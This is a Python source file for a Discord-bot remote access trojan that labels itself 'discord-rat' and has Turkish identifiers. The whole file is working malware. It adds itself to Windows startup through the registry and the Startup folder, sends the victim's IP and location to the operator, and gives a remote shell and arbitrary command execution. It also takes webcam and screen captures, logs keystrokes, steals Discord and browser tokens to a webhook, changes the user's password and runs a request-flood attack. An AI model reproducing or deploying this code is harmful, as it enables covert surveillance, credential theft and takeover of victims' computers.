import os
import discord
from discord.ext import commands
from discord import File
import json
import random
import re
import subprocess
from urllib.request import Request, urlopen
import threading
import asyncio
from pynput.keyboard import Listener, Key
import keyboard as kb
import keyboard
import threading
import pyautogui
import shutil
import cv2
import webbrowser
import sys
import asyncio
import winreg as reg
import socket
from PIL import ImageGrab
import requests
serverid = ""  #Your Server ID
token = ""  #Your Bot Token
if os.name == "nt":
  isletim_sistemi = "Windows"
if os.name == "posix":
  isletim_sistemi = "Linux"
Bot = commands.Bot(command_prefix="wq.", intents=discord.Intents.all())
key = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpRrSstTVvUuVvYyZzXxWw0123456789#$-/"
key_length = 20
userkey = ''.join(random.sample(key, key_length))
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
def add_to_startup(file_path=""):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    if not os.path.exists(file_path):
        return
    try:
        reg_key = reg.HKEY_CURRENT_USER
        key_value = "PythonStartup"
        reg.CreateKey(reg_key, key)
        registry_key = reg.OpenKey(reg_key, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, key_value, 0, reg.REG_SZ, file_path)
        reg.CloseKey(registry_key)
    except Exception as e:
        print(e)
def move_to_startup_folder(file_path=""):
    try:
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\Windows\Start Menu\Programs\Startup")
        if os.path.exists(startup_folder):
            shutil.copy(file_path, startup_folder)
            
    except Exception as e:
        print(e)

def main():
    script_path = os.path.abspath(sys.argv[0])
    add_to_startup(script_path)
    move_to_startup_folder(script_path)
if __name__ == "__main__":
    main()
@Bot.event
async def on_ready():
    ipbilgisi = requests.get("http://ip-api.com/json/")
    flagdata = requests.get("https://geolocation-db.com/json/")
    bayrakdatasi = flagdata.json()
    ipdata = ipbilgisi.json()
    ipaddress = ipdata["query"]
    country = bayrakdatasi["country_code"].lower()
    ucountry = bayrakdatasi["country_code"].upper()
    city = bayrakdatasi["city"]
    server = Bot.get_guild(int(serverid))
    if server is None:
        print("Failed to find the server.")
        return
    channel_name = os.path.split(os.path.expanduser("~"))[-1]
    try:
        ratchannel = discord.utils.get(server.text_channels, name=channel_name)
        if ratchannel is None:
            ratchannel = await server.create_text_channel(channel_name)
            print("Text channel created successfully.")
    except discord.HTTPException as e:
        print(f"Error creating or accessing text channel: {e}")
        return
    try:
        with open("key.json", "r") as oku:
            veri = json.load(oku)
            data = veri["key"]
            embed = discord.Embed(title="Information",description="Target's Information",color=0x00ff00)
            embed.add_field(name="Session Name",value=f"{channel_name}",inline=True)
            embed.add_field(name="Country",value=f":flag_{country}: ({ucountry})/{city}",inline=True)
            embed.add_field(name='IP Address', value=f'```{ipaddress}```', inline=True)
            embed.add_field(name='Local IP Address', value=f'```{IPAddr}```', inline=True)
            embed.add_field(name='Operating System', value=f'```{isletim_sistemi}```', inline=True)
            embed.add_field(name='Key', value=f'```{data}```', inline=True)
            embed.set_footer(text='discord-rat')
            await ratchannel.send(embed=embed)
    except FileNotFoundError:
        data = {"key": userkey}
        with open("key.json", "w") as yaz:
            json.dump(data, yaz, indent=4)
            embed = discord.Embed(title="Information",description="Target's Information",color=0x00ff00)
            embed.add_field(name="Session Name",value=f"{channel_name}",inline=True)
            embed.add_field(name="Country",value=f":flag_{country}: ({ucountry})/{city}",inline=True)
            embed.add_field(name='IP Address', value=f'```{ipaddress}```', inline=True)
            embed.add_field(name='Local IP Address', value=f'```{IPAddr}```', inline=True)
            embed.add_field(name='Operating System', value=f'```{isletim_sistemi}```', inline=True)
            embed.add_field(name='Key', value=f'```{userkey}```', inline=True)
            embed.set_footer(text='discord-rat')
            await ratchannel.send(embed=embed)
    except Exception as e:
        print(f"Error accessing key file or sending key: {e}")
        print("Failed to find or create text channel.")

@Bot.command()
async def sessions(ctx):
    colorlist = [discord.Color.green(),discord.Color.blue(),discord.Color.dark_orange(),discord.Color.dark_magenta()]
    renksec = random.choice(colorlist)
    oturumadi = os.path.split(os.path.expanduser("~"))[-1]
    with open("key.json", "r") as oku:
            veri = json.load(oku)
            data = veri["key"]
    embed = discord.Embed(title="Sessions",color=renksec)
    embed.add_field(name="Session Name",value=f"```{oturumadi}```",inline=True)
    embed.add_field(name='Key', value=f'```{data}```', inline=True)
    embed.set_footer(text='discord-rat sessions')
    await ctx.send(embed=embed)
@Bot.command()
async def search(ctx,id,ara):
    if controlid(id=id) == True:
        webbrowser.open(f"https://google.com/search?q={ara}")
        await ctx.send(f"Searched: {ara}")

@Bot.command()
async def notepad(ctx,id,*,metin=None):
    if controlid(id=id) == True:
        if metin == None:
            pyautogui.press("win")
            pyautogui.write("notepad")
            pyautogui.press("enter")
        elif metin != None:
            pyautogui.press("win")
            pyautogui.write("notepad")
            pyautogui.press("enter")
            asyncio.sleep(0.4)
            pyautogui.write(metin)

@Bot.command()
async def dos(ctx,id,site): #request attack
    if controlid(id=id) == True:
        try:
            await ctx.send(f"Attacking ```{site}```")
            for i in range(50):
                requests.get(site)
            await ctx.send(f"Attack Ended```{site}```")
        except Exception as e:
            await ctx.send(e)


@Bot.command()
async def shell(ctx,id):
    if controlid(id=id) == True:
      await ctx.send(
        "Wq Shell Opened! Just enter your transactions and exit when the transaction is completed by typing exit"
      )
      while True:

        def check(m):
          return m.author == ctx.author and m.channel == ctx.channel

        try:
          response = await Bot.wait_for('message', check=check, timeout=30.0)
        except asyncio.TimeoutError:
          return
        if response.content == "exit":
          await ctx.send("the shell has closed")
          return

        if "cd" in response.content:
          out = response.content
          directory = out.split(" ")[1]
          outt = subprocess.check_output(f"cd {directory}", shell=True)
          await ctx.send(f"```{outt}```")

        if "dir" in response.content:
          out = response.content
          outt = subprocess.check_output("dir", shell=True)
          await ctx.send(f"```{outt}```")

        if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
          try:
            if "cd" in response.content:
              out = response.content
              directory = out.split(" ")[1]
              subprocess.run(f"cd {directory}", shell=True)

            if "dir" in response.content:
              out = response.content
              subprocess.run("dir", shell=True)
            out = subprocess.check_output(response.content, shell=True)
            newout = out + b"\n"
            await ctx.send(f"```{newout}```")

          except:
            await ctx.send(
              "An error has occurred")
            while True:                          
              try:
                response = await Bot.wait_for('message',
                                              check=check,
                                              timeout=30.0)
              except asyncio.TimeoutError:
                return
              if response.content == "exit":
                return
              if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
                try:
                  if "cd" in response.content:
                    out = response.content
                    directory = out.split(" ")[1]
                    subprocess.run(f"cd {directory}", shell=True)

                  if "dir" in response.content:
                    out = response.content
                    subprocess.run("dir", shell=True)
                    out = subprocess.check_output(response.content, shell=True)
                    newout = out + b"\n"
                    await ctx.send(f"```{newout}```")

                except:
                  await ctx.send("Are you sure? (y/n)")
                  while True:
                    try:
                      response = await Bot.wait_for('message',
                                                    check=check,
                                                    timeout=30.0)
                    except asyncio.TimeoutError:
                      return
                    if response.content == "y":
                      await ctx.send("the shell has closed!")
                      return
                    if response.content != "exit" and "cd" not in response.content and "dir" not in response.content:
                      try:
                        if "cd" in response.content:
                          out = response.content
                          directory = out.split(" ")[1]
                          subprocess.run(f"cd {directory}", shell=True)

                        if "dir" in response.content:
                          out = response.content
                          outt = subprocess.check_output("dir", shell=True)
                          await ctx.send(f"```{outt}```")
                        out = subprocess.check_output(response.content,
                                                      shell=True)
                        newout = out + b"\n"
                        await ctx.send(f"```{newout}```")
                      except:
                        await ctx.send(
                          f"something went wrong"
                        )
                        await asyncio.sleep(3)
                        await ctx.send(
                          f"I have closed this id -> {id}"
                        )

                        exit()

@Bot.command()
async def get_webcam(ctx, id,num=None):
  if num != None:
    i = 1
    for i in range(int(num)):
        if controlid(id=id) == True:
          cap = cv2.VideoCapture(0)
          ret, frame = cap.read()
          cv2.imwrite('ss.png', frame)
          cap.release()
          with open("ss.png", "rb") as f:
            file = File(f)
            await ctx.channel.send(file=file)
          os.remove("ss.png")
          await asyncio.sleep(1)
  if num == None:
        if controlid(id=id) == True:
          cap = cv2.VideoCapture(0)
          ret, frame = cap.read()
          cv2.imwrite('ss.png', frame)
          cap.release()
          with open("ss.png", "rb") as f:
            file = File(f)
            await ctx.channel.send(file=file)
          os.remove("ss.png")
          await asyncio.sleep(1)

@Bot.command()
async def altf4(ctx,id):
    if controlid(id=id) == True:
        keyboard.press('alt')
        keyboard.press('f4')
        keyboard.release('f4')
        keyboard.release('alt')

    
@Bot.command()
async def delete_channel(ctx, channel_name: str):
    for channel in ctx.guild.channels:
        if channel.name == channel_name:
            await channel.delete()

@Bot.command()
async def keylogger(ctx, id):
    if controlid(id=id) == True:
        SHOULD_RECORD = True
        recorded_keys = []
        def on_press(key):
            nonlocal recorded_keys
            if SHOULD_RECORD:
                try:
                    recorded_keys.append(key.char)
                except AttributeError:
                    recorded_keys.append(str(key))
        def start_rec():
            with Listener(on_press=on_press) as listener:
                listener.join()
        def stop_rec():
            nonlocal SHOULD_RECORD
            SHOULD_RECORD = False
        rec_thread = threading.Thread(target=start_rec)
        rec_thread.start()
        await asyncio.sleep(20) #you can change the default 20 if you want more time!
        stop_rec()
        logs = ''.join(recorded_keys)
        await ctx.send(f"Logs of the user who has {id}:\n```{logs}```") 

@Bot.command()
async def open_link(ctx, id, *, link=None):
    if controlid(id=id) == True:
      if link == None:
        await ctx.send("Please Enter a link")
        return
      if link != None:
        webbrowser.open(link)

@Bot.command()
async def shutdown(ctx,id):
    if controlid(id=id) == True:
        await ctx.send("Bye...")
        exit()

@Bot.command()
async def shutdownnpc(ctx,id):
    if controlid(id=id) == True:
        os.system("shutdown -s -f -t 1")
        await ctx.send("Bye...")
        exit()

@Bot.command()
async def restart(ctx,id):
    if controlid(id=id) == True:

        await ctx.send("Restarting...")
        os.system(f"python {os.path.abspath(__file__)}") # If you want to use exe format remove python
        exit()
@Bot.command()
async def get_token(ctx, id):
    
    if controlid(id=id) == True:
        hostname = os.path.split(os.path.expanduser("~"))[-1]
        webhook = await ctx.channel.create_webhook(name=hostname)
    
        WEBHOOK_URL = webhook.url
        PING_ME = False
    
        def find_tokens(path):
            path += '\\Local Storage\\leveldb'
            tokens = []
        
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens
    
        def main():
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
    
            paths = {
                'Discord': roaming + '\\Discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Discord PTB': roaming + '\\discordptb',
                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
            }
    
            message = '@everyone' if PING_ME else ''
    
            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue
    
                message += f'\n**{platform}**\n```\n'
    
                tokens = find_tokens(path)
    
                if len(tokens) > 0:
                    for token in tokens:
                        message += f'{token}\n'
                else:
                    message += 'Token Bulunamadı.\n'
    
                message += '```'
    
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }
    
            payload = json.dumps({'content': message})
    
            try:
                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
                urlopen(req)
            except:
                pass
    
        main()

     

def controlid(id):
    with open("key.json", "r") as keyoku:
        keydata = json.load(keyoku)
        if keydata["key"] == id:
            return True
        else:
            return False

@Bot.command()
async def click(ctx, id, x, y):
    if controlid(id=id) == True:
        pyautogui.click(x=int(x), y=int(y))
        await ctx.send("Completed!")
@Bot.command()
async def press(ctx, id, key):
    if controlid(id=id) == True:
        pyautogui.press(key)
        pyautogui.release(key)
@Bot.command()
async def write(ctx, id, yazi):
    if controlid(id=id) == True:
        pyautogui.write(yazi)
@Bot.command()
async def get_screen(ctx, id):
    if controlid(id=id) == True:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
          file = File(f)
          await ctx.channel.send(file=file)
        os.remove("screenshot.png")
@Bot.command()
async def command(ctx,id,*,cmd):
   if controlid(id=id) == True:
      os.system(f"{cmd}")

@Bot.command()
async def change_password(ctx,id,sifre=None):
    if controlid(id=id) == True:
      if sifre != None:
        username = os.getlogin()
        try:
          os.system(f"net user {username} {sifre}")
          await ctx.send(f"The Password Was Changed Successfully -> {sifre}")
        except:
          await ctx.send("Error")
      if sifre == None:
        await ctx.send("You forgot to enter the password")

@Bot.command()
async def clear(ctx, amount: int = -1):
  if amount == -1:
    await ctx.channel.purge(limit=1000000)
  else:
    await ctx.channel.purge(limit=amount)
Bot.run(token)
